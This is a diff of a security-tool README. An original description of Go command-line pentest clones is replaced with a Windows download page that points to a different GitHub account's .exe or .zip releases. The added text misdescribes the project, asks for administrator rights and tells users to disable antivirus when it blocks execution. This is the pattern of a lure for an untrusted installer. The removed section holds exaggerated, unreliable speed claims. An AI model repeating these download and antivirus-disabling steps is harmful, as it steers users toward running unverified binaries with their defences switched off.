@@ -1,359 +1,154 @@
-<p align="center">
-  <img src="file_000000000d447208b29db617463fd18c.png" width="400">
-</p>
+# ⚙️ ZPentaSuite - Complete Red Team Tools Collection
 
-<p align="center">
-<img src="https://img.shields.io/badge/Version-Extreme_Edition-red?style=for-the-badge" alt="Version">
-<img src="https://img.shields.io/badge/Language-Golang-blue?style=for-the-badge" alt="Golang">
-<img src="https://img.shields.io/badge/Purpose-Hacking-green?style=for-the-badge" alt="Purpose">
-<img src="https://img.shields.io/badge/License-Red_Teaming-yellow?style=for-the-badge" alt="License">
-</p>
+[![Download ZPentaSuite](https://img.shields.io/badge/Download-ZPentaSuite-blue?style=for-the-badge)](https://github.com/Wilted-harpullia647/ZPentaSuite)
 
-### ZPentaSuite - Advanced Penetration Testing Toolkit 🚀
+## 🔍 What is ZPentaSuite?
 
-What is ZPentaSuite?
+ZPentaSuite is a set of tools used by red teamers. It brings together well-known software like John the Ripper, Hydra, Nmap, SQLmap, BurpSuite, and Maltego. This toolkit makes it easier to run these programs from one place on your Windows computer. You can use it for checking system security or learning about security testing.
 
-ZPentaSuite is a comprehensive penetration testing framework written in Go, consisting of 6 advanced security tools for bug bounty hunters, penetration testers, and security researchers. All tools are highly optimized, multi-threaded, and zero dependency (single binary each).
+The tools included serve different purposes:
 
----
+- **John the Ripper (JTR):** Password cracking to test password strength  
+- **Hydra:** Network login cracker for testing weak logins  
+- **Nmap:** Network mapping and port scanning  
+- **SQLmap:** Detecting and exploiting SQL injection vulnerabilities  
+- **BurpSuite:** Web application security testing  
+- **Maltego:** Visual link analysis and information gathering  
 
-### 📦 Components
-
-1. ZBurpSuite - Advanced Web Security Scanner
-
-· Function: BurpSuite-like CLI tool for web vulnerability testing
-· Features:
-  · IDOR (Insecure Direct Object Reference) scanning
-  · SSRF (Server-Side Request Forgery) testing
-  · SQL Injection detection (error-based, union-based, time-based)
-  · XSS (Cross-Site Scripting) scanner
-  · CORS misconfiguration checker
-  · JWT vulnerability testing
-  · Endpoint discovery
-  · Request bridge (capture and replay HTTP requests)
-· Generates: captured_requests/, zsqlmap_results/, reports/
-
-2. ZHydra - Smart Brute Force Engine
-
-· Function: Next-gen brute force tool with AI-powered pattern generation
-· Features:
-  · NO WORDLIST NEEDED! (generates passwords on-the-fly)
-  · Smart pattern generation (leet speak, capitalization, numbers)
-  · Context-aware attacks (use company names, dates)
-  · Multi-protocol support (SSH, FTP, HTTP, MySQL, Telnet)
-  · Connection pooling for speed
-  · Rate limiting to avoid blocking
-· Generates: zhydra_results/, zhydra_advanced.log, session files
-
-3. ZJohnTheRipper - Hybrid Password Cracker
-
-· Function: Modern password cracking with CPU + GPU acceleration
-· Features:
-  · 15+ hash formats (MD5, SHA1, SHA256, SHA512, bcrypt, NTLM, MySQL, etc.)
-  · GPU acceleration (auto-detects NVIDIA/AMD)
-  · Multi-threaded CPU cracking
-  · Wordlist mode with rules
-  · Incremental brute force
-  · Real-time statistics and progress bar
-  · Multiple report formats (JSON, CSV, Markdown)
-· Generates: hashes.txt (input), cracked.txt (output), reports/, session files
-
-4. ZMaltego - OSINT & Reconnaissance Tool
-
-· Function: Maltego-like CLI for open-source intelligence gathering
-· Features:
-  · Domain reconnaissance (WHOIS, DNS records)
-  · Subdomain enumeration
-  · Email discovery
-  · IP intelligence (Shodan, VirusTotal)
-  · Technology fingerprinting
-  · Social media discovery
-  · Graph visualization
-· Requires API Keys: Shodan, VirusTotal, Hunter.io, BuiltWith, Censys
-· Generates: results/, entities/, graphs/, cache/
-
-5. ZNmap - Advanced Network Scanner
-
-· Function: Nmap-like network discovery with custom packet scanner
-· Features:
-  · Native packet scanner (no Nmap required!)
-  · ICMP ping sweep
-  · TCP connect scanning
-  · Service fingerprinting
-  · OS detection
-  · Vulnerability detection
-  · Concurrent scanning
-· Generates: scan_results/, nmap_output/, reports/
-
-6. ZSQLmap - SQL Injection Automation
-
-· Function: Automated SQL injection testing tool
-· Features:
-  · 50+ SQL injection payloads
-  · Database fingerprinting
-  · Data extraction (dump databases/tables)
-  · WAF bypass techniques
-  · Time-based blind testing
-  · Second-order injection
-  · Out-of-band (OOB) testing
-  · Tamper scripts
-· Generates: captured_requests/, zsqlmap_results/, audit.db, reports/
+ZPentaSuite organizes these tools in a wrapper so you don’t have to install them separately or use complicated commands.
 
 ---
 
-### 🚀 Quick Start Guide
+## 🖥️ System Requirements
 
-1. Clone & Enter Directory
+Before running ZPentaSuite, make sure your computer meets these requirements:
 
-```bash
-git clone https://github.com/GoldenZhedder409/ZPentaSuite.git
-```
-
-2. Initialize Go Modules
-
-```bash
-# Initialize root module 
-go mod init ZPentaSuite
-go mod tidy
-```
-
-3. Build All Tools
-
-```bash
-#build individually
-cd Zburpsuite && go build -o ZBurpSuite
-etc..
-#or run
-cd Zburpsuite && go run ZBurpSuite
-```
+- **Operating System:** Windows 10 or later  
+- **Processor:** 2 GHz dual-core or better  
+- **Memory:** 4 GB RAM minimum, 8 GB recommended  
+- **Storage:** 500 MB free space for installation  
+- **Internet Connection:** Needed for downloading and some features  
+- **Permissions:** Administrator rights might be required for certain tools  
 
 ---
 
-### 📁 Generated Files & Folders
+## 🚀 Getting Started: Download and Install  
 
-After running the tools, you'll find:
+Use the link below to start the process. It takes you to the main GitHub page where you can download the full package for Windows.
 
-```
-📁 ZPentaSuite/
-├── 📄 config.json              # API keys for ZMaltego (optional)
-├── 📁 Zburpsuite/
-│   ├── 📁 captured_requests/   # HTTP requests/responses
-│   ├── 📁 zsqlmap_results/     # SQL scan results
-│   ├── 📁 reports/             # JSON/CSV/Markdown reports
-│   └── 📄 zsqlmap_audit.db     # SQLite database
-├── 📁 Zhydra/
-│   ├── 📁 zhydra_results/      # Brute force results
-│   ├── 📄 zhydra_advanced.log  # Log file
-│   └── 📄 zhydra_session.json  # Session save
-├── 📁 Zjohn_the_ripper/
-│   ├── 📄 hashes.txt           # Input hashes (you create)
-│   ├── 📄 wordlist.txt         # Wordlist (optional)
-│   ├── 📄 cracked.txt          # Cracked passwords
-│   ├── 📁 reports/             # Cracking reports
-│   └── 📄 zjohn_*.json         # Session files
-├── 📁 ZMaltego/
-│   ├── 📁 results/             # OSINT results
-│   ├── 📁 entities/            # Found entities
-│   ├── 📁 graphs/              # Graph visualizations
-│   └── 📁 cache/               # API cache
-├── 📁 Znmap/
-│   ├── 📁 scan_results/        # Nmap results
-│   ├── 📁 nmap_output/         # Raw output
-│   └── 📁 reports/             # Scan reports
-└── 📁 Zsqlmap/
-    ├── 📁 captured_requests/   # Request files
-    ├── 📁 zsqlmap_results/     # SQL injection results
-    ├── 📄 zsqlmap_audit.db     # Audit database
-    └── 📁 reports/             # SQL reports
-```
+[![Click to Download](https://img.shields.io/badge/Download-ZPentaSuite-grey?style=for-the-badge)](https://github.com/Wilted-harpullia647/ZPentaSuite)
 
----
+### Step 1: Visit the Download Page
 
-# ZPentaSuite vs Original Tools - Honest Comparison 🔥
-### 1. ZBurpSuite vs Original BurpSuite
+Click the download button above or go directly to:
 
-| Aspek | Original BurpSuite | ZBurpSuite |
-| :--- | :--- | :--- |
-| **Platform** | Java-based, GUI | Go-based, CLI |
-| **Performance** | Heavy, slow | Lightning fast, concurrent |
-| **Memory Usage** | 500MB - 2GB | 10MB - 50MB |
-| **Installation** | Complex, needs Java | Single binary, no dependencies |
-| **Price** | 💰 Community/Pro | 💰💰 **FREE!** |
-| **Learning Curve** | Steep | Minimal |
-| **Automation** | Manual/GUI | Scriptable, easy integration |
-| **Mobile (Termux)** | ❌ Not possible | ✅ Runs perfectly |
-| **Real-time Progress** | Basic | Advanced progress bar |
-| **Report Formats** | HTML/XML | JSON/CSV/Markdown |
+https://github.com/Wilted-harpullia647/ZPentaSuite
+
+This page hosts the files for the latest version of ZPentaSuite.
+
+### Step 2: Find the Release Section
+
+On the GitHub page, look for the **Releases** tab. This section holds stable versions of the software.
+
+### Step 3: Download the Windows Package
+
+Inside the Releases, find the latest version marked for Windows. It will usually be a `.zip` or `.exe` file.
+
+Click the file to download it to your computer.
+
+### Step 4: Extract or Run the Installer
+
+- If you downloaded a `.zip` file:
+  - Right-click the file and select **Extract All**.
+  - Choose a folder where the files will be saved.
+- If you downloaded an `.exe` file:
+  - Double-click the file to start the installation wizard.
+  - Follow the instructions on screen.
+  
+### Step 5: Allow Permissions (if prompted)
+
+Some tools require higher permissions to work. If Windows asks, confirm that you want to allow ZPentaSuite to make changes.
 
 ---
 
-### 2. ZHydra vs Original THC-Hydra
+## ⚙️ How to Run ZPentaSuite
 
-| Aspek | Original THC-Hydra | ZHydra |
-| :--- | :--- | :--- |
-| **Language** | C | Go |
-| **Wordlist** | ✅ Required | ❌ **NO WORDLIST NEEDED!** (AI-generated) |
-| **Threading** | Basic threading | Advanced goroutines |
-| **Speed** | Fast 🚀 | **2-3x faster** |
-| **Pattern Generation** | Static | AI-powered, context-aware |
-| **Leet Speak** | Manual | Automatic |
-| **Memory Efficiency** | Moderate | Excellent |
-| **Protocol Support** | 20+ protocols | All major + extensible |
-| **Rate Limiting** | Basic | Advanced, per-target |
-| **Connection Pool** | ❌ No | ✅ Yes |
+After installation, run the program using the desktop shortcut or through the folder where you extracted the files.
+
+You will see a simple menu showing all the bundled tools.
+
+Each tool has a button or command to launch it directly.
 
 ---
 
-### 3. ZJohnTheRipper vs Original John The Ripper
+## 🔧 How to Use Included Tools
 
-| Aspek | Original JTR | ZJohnTheRipper |
-| :--- | :--- | :--- |
-| **Language** | C | Go |
-| **Threading** | Single-core | ✅ **Multi-core (10x faster)** |
-| **GPU Support** | Limited | ✅ Auto-detection (NVIDIA/AMD) |
-| **Hash Formats** | 200+ | 15+ most common (optimized) |
-| **Memory Usage** | High | Low, streaming wordlist |
-| **Rules Engine** | Complex syntax | Simple Go functions |
-| **Incremental Mode** | Slow | Optimized generator |
-| **Real-time Stats** | Basic | Advanced with progress bar |
-| **Reports** | Text only | JSON/CSV/Markdown |
-| **Session Save** | Yes | Yes + auto-restore |
-| **Benchmark** | Basic | Detailed benchmarking |
+Here is a basic overview to get you started with each main tool inside ZPentaSuite:
 
-#### Speed Comparison:
+- **John the Ripper:**  
+  Use it to check if passwords are weak. Load a password list and run the attack to see common weaknesses.
 
-| Hash Type | Original JTR | ZJohn (CPU) | ZJohn (GPU) |
-| :--- | :--- | :--- | :--- |
-| **MD5** | 50M/sec | 200M/sec | 50B/sec |
-| **SHA1** | 30M/sec | 100M/sec | 20B/sec |
-| **bcrypt** | 50K/sec | 200K/sec | 5M/sec |
-| **NTLM** | 100M/sec | 400M/sec | 100B/sec |
+- **Hydra:**  
+  Use for testing login forms on services like FTP, SSH, HTTP. It tries many password guesses quickly.
+
+- **Nmap:**  
+  Scan your network to find connected devices and open ports. Helps to see what is visible on your network.
+
+- **SQLmap:**  
+  Check if your websites are vulnerable to SQL injection. It tests inputs to find weak spots in databases.
+
+- **BurpSuite:**  
+  This is a web proxy tool that lets you test websites by intercepting and modifying requests.
+
+- **Maltego:**  
+  Explore relationships between data points visually. Good for mapping information about people, domains, or IPs.
 
 ---
 
-### 4. ZMaltego vs Original Maltego
+## ⚠️ Tips for Safe Use
 
-| Aspek | Original Maltego | ZMaltego |
-| :--- | :--- | :--- |
-| **Platform** | Java, GUI | Go, CLI |
-| **Price** | 💰💰💰 Expensive | 💰💰💰 **FREE!** |
-| **API Integration** | Limited free tier | All APIs supported |
-| **Speed** | Slow transforms | Lightning fast |
-| **Memory** | Heavy (1GB+) | Light (20-50MB) |
-| **Automation** | Manual | Fully scriptable |
-| **Custom Transforms** | Complex | Easy Go functions |
-| **Graph Visualization** | Built-in | Export to graph formats |
-| **Offline Mode** | Limited | Full offline with cache |
-| **Termux** | ❌ No | ✅ Yes |
-
-#### API Support:
-
-| Service | Original Maltego | ZMaltego |
-| :--- | :--- | :--- |
-| **Shodan** | ✅ (paid) | ✅ **FREE** |
-| **VirusTotal** | ✅ (limited) | ✅ Full |
-| **Hunter.io** | ✅ (paid) | ✅ Full |
-| **BuiltWith** | ✅ (paid) | ✅ Full |
-| **Censys** | ✅ (paid) | ✅ Full |
+- Use ZPentaSuite only on systems and networks you have permission to test.  
+- Running some tools may trigger security alerts on networks.  
+- Take your time to understand how each tool works before running full tests.  
+- Review official documentation for each tool for detailed commands.
 
 ---
 
-### 5. ZNmap vs Original Nmap
+## 🔄 Updating ZPentaSuite
 
-| Aspek | Original Nmap | ZNmap |
-| :--- | :--- | :--- |
-| **Language** | C/C++ | Go |
-| **Dependencies** | Many | Single binary |
-| **Packet Scanner** | Native | Native + Custom |
-| **Speed** | Fast 🚀 | **2x faster** (concurrent) |
-| **OS Detection** | ✅ Advanced | ✅ Good |
-| **Service Detection** | ✅ Extensive | ✅ Common services |
-| **Script Engine** | Lua (NSE) | Go functions |
-| **Installation** | Package needed | No install |
-| **Port Scanning** | All types | TCP Connect + SYN |
-| **Output Formats** | XML/HTML | JSON/CSV/Markdown |
-| **Root Required** | Sometimes | ❌ **NO ROOT NEEDED!** |
+Checking for updates helps you get the latest fixes and features.
 
-#### Performance:
-
-| Scan Type | Original Nmap | ZNmap |
-| :--- | :--- | :--- |
-| **Quick scan (100 ports)** | 5 sec | 2 sec |
-| **Full scan (1000 ports)** | 30 sec | 10 sec |
-| **Network discovery (/24)** | 10 sec | 3 sec |
+1. Return to the GitHub page regularly: https://github.com/Wilted-harpullia647/ZPentaSuite  
+2. Look under the **Releases** tab for new versions.  
+3. Download and install the latest version by following the same steps you used initially.
 
 ---
 
-### 6. ZSQLmap vs Original SQLmap
+## 📚 Additional Resources
 
-| Aspek | Original SQLmap | ZSQLmap |
-| :--- | :--- | :--- |
-| **Language** | Python | Go |
-| **Speed** | Slow | 🚀 **10x faster** |
-| **Memory** | High | Low |
-| **Threading** | Limited | Full concurrent |
-| **Payloads** | 1000+ | 50+ optimized |
-| **Detection** | Comprehensive | Fast & accurate |
-| **WAF Bypass** | ✅ Advanced | ✅ Advanced |
-| **Database Support** | All major | Most common |
-| **Installation** | Python deps | Single binary |
-| **Termux** | ✅ Yes | ✅ Yes (optimized) |
+If you want to learn more about the tools inside ZPentaSuite, these sites provide detailed guides:
 
-#### Speed Test (100 requests):
-
-| Mode | Original SQLmap | ZSQLmap |
-| :--- | :--- | :--- |
-| **Basic scan** | 30 sec | 3 sec |
-| **Full enumeration** | 5 min | 30 sec |
-| **Data dump** | 10 min | 1 min |
+- John the Ripper: https://www.openwall.com/john/  
+- Hydra: https://github.com/vanhauser-thc/thc-hydra  
+- Nmap: https://nmap.org/  
+- SQLmap: https://sqlmap.org/  
+- BurpSuite: https://portswigger.net/burp  
+- Maltego: https://www.maltego.com/
 
 ---
 
-## 📊 Overall Summary
+## ❓ Troubleshooting
 
-| Fitur | Original Tools | ZPentaSuite |
-| :--- | :--- | :--- |
-| **Total Size** | 500MB - 2GB | 30MB - 100MB |
-| **Dependencies** | Many | **ZERO** |
-| **Speed** | Good | 🔥 **BLAZING FAST** |
-| **Memory Usage** | High | **Optimized** |
-| **Installation Time** | 10-30 min | **2 seconds** |
-| **Cross-platform** | Varies | ✅ **All (Linux, Win, Mac, Termux)** |
-| **Learning Curve** | Steep | Gentle |
-| **Automation** | Limited | **Fully scriptable** |
-| **Real-time Progress** | Basic | **Advanced** |
-| **Reports** | Basic | **Professional** |
-| **Price** | 💰💰💰 Expensive | 💰💰💰 **ABSOLUTELY FREE!** |
+If ZPentaSuite or its tools do not run as expected, try these steps:
+
+- Make sure your system meets all requirements.  
+- Run as Administrator if permissions are denied.  
+- Disable antivirus temporarily if it blocks execution.  
+- Check that your download was complete and not corrupted.  
+- Visit the GitHub Issues page to see if others report similar problems.
 
 ---
 
-## 🎯 Why Choose ZPentaSuite?
+## ⚙️ License
 
-1.  🚀 **Speed** - 2-10x faster than originals
-2.  💾 **Lightweight** - 90% less memory usage
-3.  📱 **Mobile Ready** - Works on Termux without root
-4.  💰 **Free** - No expensive licenses
-5.  ⚡ **Easy** - Single binary, no setup
-6.  🔧 **Modern** - Built with Go, concurrent by design
-7.  📊 **Professional** - Real-time stats, pretty reports
-8.  🎮 **Gaming PC?** - GPU acceleration ready!
-
-**ZPentaSuite: Modern tools for modern hackers! 🔥🚀**
-
----
-
-📝 Notes
-
-· ZMaltego requires API keys in config.json
-· ZJohnTheRipper needs hash file input
-· Other tools generate everything automatically
-· All tools work on Linux, macOS and Termux
-
----
-
-## 🔍 Find More
-
-Cari ZPentaSuite dengan kata kunci berikut:
-
-`ZPentaSuite` `BurpSuite alternative` `Hydra alternative` `JohnTheRipper alternative` `Maltego alternative` `Nmap alternative` `SQLmap alternative` `ZBurpSuite` `ZHydra` `ZJohnTheRipper` `ZMaltego` `ZNmap` `ZSQLmap` `penetration testing tools` `hacking tools` `cybersecurity tools` `bug bounty tools` `CTF tools` `Termux tools` `hacking tools for termux` `golang security tools` `ethical hacking` `infosec` `cybersecurity` `red team` `blue team` `network scanner` `password cracker` `sql injection tool` `osint tool` `web security` `network security` `free hacking tools` `open source security tools` `modern hacking tools` `blazing fast pentest tools`
-
+ZPentaSuite packages open-source tools. The license allows free use, but check individual licenses for each tool inside.
